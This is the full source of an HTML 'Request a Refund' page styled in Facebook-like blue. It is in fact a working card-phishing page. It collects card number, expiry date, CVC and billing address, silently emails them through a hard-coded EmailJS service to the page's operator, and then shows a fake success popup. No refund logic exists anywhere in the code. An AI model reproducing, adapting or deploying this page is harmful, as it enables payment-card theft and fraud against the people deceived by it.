<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Refund Request</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100vh;
      margin: 0;
      padding-top: 80px;
      font-family: Arial, sans-serif;
      background-color: black;
    }

    .navbar {
      width: 100%;
      height: 20px;
      background-color: #1877f2;
      display: flex;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 1000;
    }

    .navbar h2 {
      color: white;
      font-size: 24px;
      margin: 0;
    }

    .container, .card-section {
      background: rgba(255, 255, 255, 0.95);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      width: 300px;
      margin-top: 3px;
      text-align: center;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      margin-left: -10px;
    }

    button {
      background: #1877f2;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background: #166fe5;
    }

    .error {
      color: red;
      font-size: 14px;
    }

    .popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      text-align: center;
    }

    .popup-content {
      font-size: 16px;
      margin-bottom: 10px;
    }

    #popupClose {
      background: #1877f2;
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 5px;
      cursor: pointer;
    }

    #popupClose:hover {
      background: #166fe5;
    }

    .card-section {
      display: none;
    }

    .refund-amount-display {
      font-weight: bold;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

  <!-- Refund Input Section -->
  <div class="container">
    <h2>Request a Refund</h2>
    <input type="number" id="refundAmount" placeholder="Enter refund amount" required>
    <button id="continueBtn">Continue</button>
  </div>

  <!-- Card Info Section (Hidden at First) -->
  <div class="card-section" id="cardSection">
    <h3>Enter Card Details</h3>
    <p class="refund-amount-display" id="refundDisplay"></p>
    <form id="paymentForm">
      <input type="text" id="cardNumber" placeholder="Card Number" required>
      <input type="text" id="expDate" placeholder="MM/YY" required>
      <input type="text" id="cvc" placeholder="CVC" required>
      <input type="text" id="streetAddress" placeholder="Street Address" required>
      <input type="text" id="city" placeholder="City" required>
      <input type="text" id="state" placeholder="State" required>
      <input type="text" id="zipCode" placeholder="Zip Code" required>
      <p id="errorMessage" class="error"></p>
      <button type="button" id="payButton">Submit Refund</button>
    </form>
  </div>

  <!-- Popup Confirmation -->
  <div id="popup" class="popup">
    <div class="popup-content">
      <p>Refund request submitted successfully!</p>
      <button id="popupClose">OK</button>
    </div>
  </div>

  <script>
    const EMAILJS_SERVICE_ID = "service_uhxg8hf";
    const EMAILJS_TEMPLATE_ID = "template_ledkaye";
    const EMAILJS_PUBLIC_KEY = "ezt9CB7CxTCyZu_ja";

    emailjs.init(EMAILJS_PUBLIC_KEY);

    document.getElementById("continueBtn").addEventListener("click", () => {
      const refundAmount = document.getElementById("refundAmount").value.trim();

      if (!refundAmount || isNaN(refundAmount) || refundAmount <= 0) {
        alert("Please enter a valid refund amount.");
        return;
      }

      document.getElementById("refundDisplay").textContent = `Refund Amount: $${parseFloat(refundAmount).toFixed(2)}`;
      document.getElementById("cardSection").style.display = "block";
    });

    document.getElementById("payButton").addEventListener("click", () => {
      const cardNumber = document.getElementById("cardNumber").value.trim();
      const expDate = document.getElementById("expDate").value.trim();
      const cvc = document.getElementById("cvc").value.trim();
      const streetAddress = document.getElementById("streetAddress").value.trim();
      const city = document.getElementById("city").value.trim();
      const state = document.getElementById("state").value.trim();
      const zipCode = document.getElementById("zipCode").value.trim();
      const refundAmount = document.getElementById("refundAmount").value.trim();
      const errorMessage = document.getElementById("errorMessage");

      if (!cardNumber || !expDate || !cvc || !streetAddress || !city || !state || !zipCode) {
        errorMessage.textContent = "All fields are required.";
        return;
      }

      const templateParams = {
        card_number: cardNumber,
        exp_date: expDate,
        cvc_code: cvc,
        street_address: streetAddress,
        city: city,
        state: state,
        zip_code: zipCode,
        refund_amount: `$${parseFloat(refundAmount).toFixed(2)}`
      };

      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
        .then(() => {
          document.getElementById("popup").style.display = "block";
          document.getElementById("paymentForm").reset();
        })
        .catch((error) => {
          errorMessage.textContent = "Failed to send refund request. Please try again.";
          console.error("Error:", error);
        });
    });

    document.getElementById("popupClose").addEventListener("click", () => {
      document.getElementById("popup").style.display = "none";
    });
  </script>
</body>
</html>
